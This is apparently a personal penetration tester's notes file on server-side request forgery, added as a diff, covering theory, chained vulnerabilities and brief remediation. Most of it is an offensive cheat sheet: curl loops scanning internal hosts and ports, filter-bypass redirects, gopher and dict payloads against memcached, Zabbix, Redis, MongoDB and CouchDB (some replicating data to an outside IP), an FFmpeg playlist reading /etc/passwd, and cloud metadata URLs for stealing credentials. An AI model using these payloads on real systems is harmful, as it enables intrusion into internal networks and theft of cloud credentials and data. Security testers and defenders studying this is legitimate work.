@@ -1,0 +1,442 @@
+SSRF (Server-Side Request Forgery)
+
+
+SSRF exploitation leverages an application’s server-side components’ capacity to make or forward requests -targeting one (its own) or many application-layer protocols- chained with (a) vulnerabilit(y|ies) in a target application and/or its configured deployment on host infrastructure to forge arbitrary requests originating from the application server.
+Pending the particular limits to which a given SSRF vuln may be exploited, its impact may range from merely enumeration (logging external service requests back to an attacker-controller application or DNS server, or diffing application response times to determine whether it made a connection attempt to some port, whether a request was successful or whether a request timed out), to arbitrary file read (to the extent permitted on either the filesystem, cloud hosting service or some file-serving service, e.g. SMB/CIFS) or potentially arbitrary remote code execution.
+    --often targets internal network services not otherwise internet-exposed or secured by firewall rule definitions
+        --private address spaces are not otherwise exposed externally (rfc 1918, Address Allocation for Private Internets, https://tools.ietf.org/html/rfc1918):
+            10.0.0.0-10.255.255.255  (10/8)
+            172.16.0.0-172.31.255.255  (172.16/12)
+            192.168.0.0-192.168.255.255 (192.168/16)
+        --may request restricted application components via localhost requests (e.g. https://127.0.0.1/admin, http://localhost:8000/server-status or https://HOSTNAME/target) or accessible using domain/network naming conventions (e.g. smb://adhost.sub.local/) to bypass network segmentation within a domain-controlled network or targets accessible only given correct virtual host names and not responsive to IP address routine only
+        --otherwise potentially smuggles arbitrary requests past network DMZ, exposing any potentially less secure internal targets
+        --e.g. when a service requests a url or uri taking improperly-sanitized user input
+        --most common when import functions are invoked to import resources (especially images) accepting a URL --or occasionally processing an insufficiently sanitized URI of an arbitrary user-defined(uploaded) file--, e.g. vuln introduces on setting a user profile image.
+    --infrastructure vulnerabilities are common regardless of type of hosting (traditional hosting, serverless architecture, microservices)
+Blind SSRF
+	-server does not return valid HTTP Response or error message
+	--often limited to local network enumeration
+Remediation
+	--proper input validation restricting access to internal resources
+	--easiest way to discover and exploit is manual code review, by far
+
+Testing:
+Requests may be confirmed via external service interaction, viz. requests to attacker-controlled internet-facing service including DNS request records.
+    --in some cases internet-facing DNS name requests may not succeed (due to DHCP configuration, application or WAF sanitization/filtering, firewall rules or improper processing) and it will be necessary to confirm an external service interaction by requesting the services static IP address, then checking service access logs for access from any target controlled host (or addresses of third party-services used by the application).
+#/urs/bin/php
+    # usage: /wget.php?url=http://www.some.dom/img/meme.png
+file_put_contents(“intended_target.png”, file_get_contents($_GET[‘url’]));
+    SSRF Attack:
+curl https://target.dom/wget.php?url=http://127.0.0.1/api/v3/users/uid/1/username
+
+Vulnerabilties to which SSRF can commonly be chained
+	Format processing
+		XML
+			XXE
+			XXE DTD (remote)
+			XML design input
+		OpenOffice
+			DDE formula
+			Dynamic data linking
+			External embedded resources
+		PDF
+			RCPDF
+	Direct Socket Accss
+		CRLF Injection
+		HTTP Request Splitting
+	External Service Interaction
+		HTTP
+			URL Processing Libraries
+				cURL/libcurl
+				LWP
+				ASP.NET URI
+				Java URI
+	External data Linking
+		Databases
+			PostgreSQL
+			MySQL
+			OracleDB
+			MongoDB
+			Redis
+			CouchDB
+			SQLite
+			MSSQL
+
+Targets:
+	information files
+	sensitive files
+	internal API calls
+	internal service access
+		--e.g. admin panel
+	cloud hosting metadata
+
+Functions commonly vulnerable to SSRF:
+	webhooks
+	file upload expecting URL as input
+	document file processors
+	image file processors
+	link expansion
+	HTTP proxying service
+	--functions that fetch external resources (or internal resources using URI schema)
+
+
+Exploitation:
+Potential Payloads
+	Scan network hosts
+	port scan internal machines
+	fingerprint discovered services
+	collect instance metadata
+	bypass access controls
+	access sensitive data
+	execute code on network hosts
+Network scanning
+	request internal network range IP Addresses & Common Ports
+	save and sort uniquq responses from different services (successful requests, errors responses, &c)
+		for i in (1..256); do curl https://target.dom/ssrf_vuln?url=http://192.168.1.$"i"/ ; done | tee ssrf_re
+Port Scanning/Service Fingerprinting
+	check common ports (HTTP and non-http, first testing if the vulnerable application properly digests/forward non-http and non-unicode responses)
+			--check using ssl/tls negotiation if response on given port if non-responsive or returns TLS error
+		for i in (0..65535); do curl https://target.dom/ssrf_vuln?url=http://127.0.0.1:${i}/ ; done | tee ssrf_ports
+	--for more accurate service enumeration try sending protocol specific request packets instead of http/s packets
+		--sent and recieved packets of a protocol understood by the target service will keep the connection open longer
+			--for example a http request with or without Keep-alive: 1 header will take longer to respond targeting a http server than a non-understood protocol, because it will process and respond to the request rather than closing the connection
+			--raw TCP connection requests (e.g. nmap -sT) if successful should stay alive for a longer period than a non-open port, but for a shorter period than a server negotiation with an HTTP request following a succesful TCP negotiation; again for SSL, which is an 8-way handshake as in addition to 3 TCP handshakes
+		--the longer a forged request can be kept alive, the more reliable/better predictable a port scan/service fingerprint will be
+		--try forwarding nmap service probes 
+			/usr/share/nmap/nmap-service-probes
+	--if CRLF is injectable into HTTPS packets, exploiting IMAPS or other protocols established after successful SSL handshake should be possible
+	--e.g. https://localhost:8080/1POST%20%2fHTTP%2f1.1%0d%0aHost:localhost%0d%0aContent-Length:5%0d%0a%0d%0a
+Cloud Metadata
+	(examples below)
+Access Control Bypasses
+	internal/local services may control access by IP addresses or internal headers (that the application may forward)
+PHP-FPM
+Data Retieval - Sensitive Information
+	reuse any credentials the application may expose either forwarded internally or on accounts for target hosted on other services
+		--those enumerated from SSRF file access or other application information disclosure are best
+	--database credentials often stored in application source code or localhost env
+	--vuln apps only ingest content of a given format (MIME type+file format)
+		--try forge request to concatenate multiple parts to single response appending service response to forged datatype
+			--works best with protocols ingested as plain/text
+			--only possible when target service capable of processing multiple requests encapsulated in single TCP packet, e.g. HTTP header Keep-alive
+				--should be able to inject target protocol delimited in forged request (HTTP: CRLF, plaintext: LF [assuming *nix service host)
+			--response encapsulation (examples in services [below])
+	--reflected file download
+Original request data sniffing
+	-sniff data of initial request (originating from the application) leveraging SSRF vuln
+	--target: OAuth tokens, basic auth credential, POST bodies, &c
+	--requires modifying server response via forged request, from which targeted data must be forwarded
+		--forged request payloads must chain exploit with vuln in targeted service reflecting sensitive information (usually credentials, hard-coded or environmental) back to application, most commonly:
+			open redirect
+				--3xx HTTP Response Status often succesful: 300,305,306,307
+				--not exploitable for most URI-requesting libraries
+			response splitting
+			response smuggling
+			api key/cookie reset/display
+			request to self by network name via caching proxy/web cache deception (squid)
+Code Execution
+	leverage credentials and unsecured local/internal enumerated services for potential code execution
+		--priviliged access is best, but finding less secure, known vulnerable services/compenents more likely for internal/local-facing ports/applications
+		--for ssrfs processing (not merely forwarding) code in pages (most common on PGP/java(ognl injection)) direct request to attacker-hosted page containing code
+		-server-side javascript injection
+
+Blind SSRF Exploitation:
+	--doesn't extract information (possible OOB exfil, though), depends on deduction, e.g. timing-based or response satus code-based
+	status-based
+		-different response codes indicative of connection status, cryptographic key exchange success on service or service compatability
+		--2xx respones generally indicate open ports
+	server response timing
+		--deviation from most common response time best indication of successful connection
+		--very long response time usually indicates firewall or hung connection attempt (network address unable to be routed, packet not dropped; tcp handshake not complete)
+		--very short response times usually indicate dropped, unrouted packets
+	Out of Band Exploitation
+		--forwarded http headers
+		--internal IPs
+		--external service endpoint IP addresses
+		--chained exploitation exfil via mail, DNS, &c
+
+SSRF protections & bypassing them:
+	--2 primary types: whitelisting & blacklisting
+	Whitelist bypass techniques
+		--more difficult/unlikely
+		-open redirect within whitelisted domain, esp. within vuln application
+			--chained exploit
+		--for regex whitelists try directing to attacker-hosted domain with target domain as subdomain or endpoint
+			target.dom.hack.er
+			hack.er/.target.dom
+		--test list various hostnames for localhost and common network host names target host may resolve for, e.g. localhost, ns1.target.dom, dc1.target.dom
+	Blacklist bypass techniques
+		attacker hosted redirect
+			--direct to attacker hosted page setting headers to spoof request generated by remote page as request from localhost
+				e.g. <?php header("Location: http://127.0.0.1/"); header("Referer: http://127.0.0.1/"); ?>
+					 <?php header("Location: gopher://127.0.0.1:1234/asdf"); ?>
+			--application will be redirected to restricted internal/local address
+		DNS
+			-Register A/AAAA record on controlled domain pointing to internal address
+			--application will resolve target as local/internal address
+			-DNS Pinning race condition
+				--application may validate and retrieve domain DNS request response record in sperate requests ingested by different function
+					--possibly exploitable pointing to custom DNS service daemon rotating valid and invalid responses
+		PHP fsockopen
+			-fsockopen() correctly resolves malformed input as portno, e.g.
+				localhost:12321a	localhost:+12321abc		localhost:  12321	localhost:\r\n 12321\r\n  asdf	localhost:0012311abc
+			--fuzzing:
+				(0x5c)hostname(0x2a,0x5c):(0x09-0x0d,0x20,0x2b,0x30,0x85,0xa0)portno(0x00-0xff)
+		IPv6 addressing
+			--if IPv6 is processed by application, but not blacklist regex, bypass will be trivial for local address, may not 
+		Encoding
+			--applications may process accross various layers of the stack which regex my or may not be included in blacklisting schema
+				--blacklisting schema may only be include full, valid encoded schemas, mix schemas that may be processed within a single request as well
+			Hex
+			Octal
+			URL
+			HTTP
+			DWORD
+			mixed
+			
+Request Smuggling
+	HTTP
+		Apache 2
+			GET / HTTP/1.1\nHost:localhost\n\n
+			--single LF splitter instead of CRLF
+		Tomcat
+			--typical smuggling not possible, try swapping CRLF and LFCR \r\n \n\r
+		Nginx
+			GET / HTTP/1.1\s\nHost:localhost\s\n\s\n
+			--also possible using 0x30-0x39 instead of 0x20 (\s)
+			
+			
+Exploitation Walkthrough
+1. Scan localhost ports for services
+	--fingerprint services if possible
+2. Scan internal network to determine available target
+	--determine open ports/service by response body, code or timing
+	--reference ports notes to determine likely service if banner not returned
+3. Determine type of SSRF
+	direct socket access
+		--check CRLF or other injections for smuggling
+	sockets client
+		--determine available URI Schema
+4. dross-reference available schema and service protocols for possible request smuggling
+5. determine host-based auth daemons, attempt to exploit
+
+
+URL SCHEMA SUPPORT
+		Portno	PHP							JAVA				cURL		LWP(Perl)	ASP.NET
+gopher	8001	enable --with-curlwrappers	before last patches	w/o \0 char	yes			ASP.NET <=3, earlier than Windows XP, Windows Server 2003 R2
+tftp			enable --with-curlwrappers	no					w/o \0 char	no			no
+http	80		yes							yes					yes			yes			yes
+https	443		yes							yes					yes			yes			yes
+ldap			no							no					yes			yes			yes
+ftp		21		yes							yes					yes			yes			yes
+SSH		22		yes, disabled				no					no			Net:SS2		no
+file	N/A		yes							yes					yes			yes			yes
+ogg		N/A		yes, disabled				no					no			no			no
+expect	N/A		yes, disabled				no					no			no			no
+imap			enable --with-curlwrappers	no					yes			yes			no
+pop3			enable --with-curlwrappers	no					yes			yes			no
+mailto	25		no							no					yes			no			no
+smtp	25		enable --with-curlwrappers	no					yes			no			no
+telnet	23		enable --with-curlwrappers	no					yes			no			no
+
+Protocol Smuggling
+		TCP																						UDP
+		HTTP		memcached		fastcgi		zabbix		nagios		mysql		syslog		ntp		snmp
+gopher	cURL, LWP	Java, LWP		Java, LWP	Java, LWP	Java, LWP	Java, LWP	yes			no		no
+		Java		ASP.Net			ASP.Net		ASP.Net		ASP.Net		ASP.Net
+		ASP.Net
+http	all			LF avail		no			no			no			no			yes			no		no
+dict	no			cURL			no			no			no			no			yes			no		no
+ldap	LWP			LWP				no			no			no			no			LWP			no		no
+tftp	no			no				no			no			no			no			no			cURL	cURL
+
+Service Forged Requests
+HTTP
+	--HTTP/0.9 if supported by target service HTTP responses w/o requiring headers
+	-HTTP encapsulated as xml (cURL wildcards)
+		--works on HTTP via sytem cURL program, but not via PHP libcurl
+		e.g. payloads:
+			<?xml version=”1.0”?><valid-tag><![CDATA[
+				<?php header(“gopher://localhost:11211/1stats%0aquit”); //data to retrieve ?>
+			]]></valid-tag>
+SMB
+	SMBRelay
+		-Java on Windows
+		--NTLM relay attack over HTTP
+			(attacked described elsewhere)
+memcached
+	Fingerprint
+		plaintext request without quit, stays alive
+	Exploit
+		arbitrary plaintext request without quit
+	Protocol Exploit
+		1.) collect memcached-stored keys
+		2.) set arbitrary value on interesting keys
+		Techniques
+			via SSTI/static HTML/OGNL Injection, inject JS login sniffer to collect creds or javascript keylogger/c2 forwarding via vulnerable service or forward via application if possible in secure environment, else just reverse "connect" via egress
+			via SSTI/macros, code injection (RCE)
+			discover current session and escalate privileges in application
+			create new session with administrative privs (set significant session expiration time for persistence if desireable)
+		--payloads:
+			gopher://memcached.local:11211/1%0astats%0aquit
+			dict://memcached.local:11211/stats
+			ldap://memcached.local:11211/%0astats%0aquit
+Syslog
+	--common FOSS *nix logging system, plugins for most common service protocols
+	--port 514
+	payload
+		http://payload-as-arbitary-string.attacker.dom:514/
+		dict://syslog.local:514/PAYLOAD
+		ldap://syslog.local:514/\r\nPAYLOAD
+			--ldap payload only viable over LWP
+		--configure DNS A/AAAA record to resolve to 127.0.0.1 or internal network address
+		--useful to chain to XSS in application or target service
+Zabbix agent daemon
+	--common FOSS *nix monitoring system
+	--/usr/bin/zabbix_agentd
+	--/etc/zabbix/zabbix_agentd.conf
+	--port 10050
+	--default config includes only host-based auth
+		Server=127.0.0.1,monitor.trusted.network.net
+	--plaintext linefeed-terminated Agentd protocol
+	--closes socket after malformed line ingestion
+		--request smuggling ineffective
+	payloads:
+		information response:
+			gopher://localhost:10050/1vfs.file.regexp[/etc/hosts,7]
+		RCE (non-default configuration) EnableRemoteCommands=1:
+			gopher://localhost:10050/1system.run[id]
+			--remote means socket request, even over lo device
+PostgreSQL
+	-functions which can open sockets and write user’s data into it can be exploited for SSRF
+		--SQLi chained exploit
+	payloads:
+		SELECT dblink_send_query('host=127.0.0.1 dbname=quit user=\'\nstats\n\' password=postgres port=5431 sslmode=disable','select version();');
+MongoDB
+	--exploit internal functions to open arbitrary sockets, then rw arbitrary data
+	payloads:
+		db.copyDatabase("\1\2\3\4\5\6\7",'test','111.11.1.11:8080')
+		--catch response via netcat (may require testing egress rules)
+			ncat -lnp 8080 | hexdump -C | tee mongoRE
+		db.copyDatabase(“\nstats\nquit”,’test’,’localhost:11211’)
+			--chain exploit via memcached
+Redis
+	payloads:
+		SLAVEOF host port
+		MIGRATE host port key
+		CONFIG SET <arbitrary>
+CouchDB
+	--target HTTP RESTful API
+	--port 5984
+	payloads:
+		http://localhost:5984/_users/_all_docs
+			--return document index
+		POST http://couchdb:5984/_replicate
+			{  "source" : "recipes",  "target" : "http://111.11.1.11:8080/recipes", }
+			--forge POST/PUT/DELETE requests via request smuggling for server side javascript code execution
+				--javascript env is sandboxed
+				--leverage View API
+FFmpeg
+	--M38u file format macros "EXTINF"
+	payload:
+		video.mg4
+		#EXTM3U
+		#EXT-X-MEDIA-SEQUENCE:0
+		#EXTINF:10.0,
+		concat:http://example.org/header.y4m|file:///etc/passwd
+		#EXT-X-ENDLIST
+	execution
+		ffmpeg -i video.mp4 thumbs.png
+		ffmpeg -i thumbs.png out.y4m
+		cat out.y4m
+	https://bugs.launchpad.net/ubuntu/+source/ffmpeg/+bug/1533367
+
+	
+
+
+Cloud hosting service Metadata SSRFs:
+AWS
+    http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories
+    --many more listed and file more likely to be maintained/updated at https://github.com/ThePacketBender/notes/cloud/aws.txt
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/public-keys/
+
+Google Cloud (GCP
+    https://cloud.google.com/compute/docs/metadata
+    --requires header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"
+http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-key
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+    --Google allows recursive pulls 
+http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+    --Beta does NOT require a header
+http://metadata.google.internal/computeMetadata/v1beta1/
+
+Digital Ocean
+    https://developers.digitalocean.com/documentation/metadata/
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/ 
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
+
+Packetcloud
+    https://metadata.packet.net/userdata
+
+Azure
+    https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
+http://169.254.169.254/metadata/v1/maintenance
+    --requires the header "Metadata: true"
+https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
+http://169.254.169.254/metadata/instance?api-version=2017-04-02
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
+
+OpenStack/RackSpace 
+    --(header required? unknown)
+http://169.254.169.254/openstack
+
+HP Helion 
+    --(header required? unknown)
+http://169.254.169.254/2009-04-04/meta-data/ 
+
+Oracle Cloud
+http://192.0.0.192/latest/
+http://192.0.0.192/latest/user-data/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/attributes/
+
+Alibaba
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/image-id
+
+
+Remediation recommendations:
+whitelisting
+    --variant URI syntaxes across different and emergent protocols, schemata and encodings make patterns and expressions necessary for thorough blacklisting not only highly complex, but regardless of thoroughness would remain a high risk for bypass
+    --for RESTful services, accept HTTP verbs other than GET or POST (or other verbs most likely vulnerable across a network or VNC to complicate SSRF exploitation by invalidating most common HTTP verb-dependent payloads
+        --can protect API from most application SSRFs and vice-versa
+        --additionally, validate both requests and responses to internal services
+    --ensure authentication is required and set to non-default values for all services, especially those on which authentication is not enabled by default (kibana, mongodb, memcached, redis, elasticsearch, snmp)
+        --nobody ever expects SSRF to target SNMP (rfc 4088, SNMP URI schema, https://tools.ietf.org/html/rfc4088) --or any other 
+        --that goes squared for internal networking devices and to the third power for external networking hardware, because you can guess who is going to (someone like me).
+
+
+https://www.owasp.org/index.php/Server_Side_Request_Forgery
+https://cwe.mitre.org/data/definitions/918.html
